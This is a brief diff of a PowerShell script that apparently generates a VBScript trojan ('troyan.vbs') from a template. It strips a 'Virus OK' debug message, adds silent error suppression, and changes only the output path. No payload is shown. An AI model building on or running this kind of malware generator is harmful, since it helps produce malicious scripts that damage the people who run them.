@@ -31,7 +31,7 @@ $template  = $template -replace 'MsgBox "Virus OK"', ""
 $template  = $template -replace "' Hello Moto", "On Error Resume Next"
 $template  = $template -replace '"00","01"', $listString
 
-$troyan = Join-Path -Path $scriptDir -ChildPath './troyan.vbs'
+$troyan = Join-Path -Path $scriptDir -ChildPath '../troyan.vbs'
 
 $template | Set-Content -Path $troyan
 
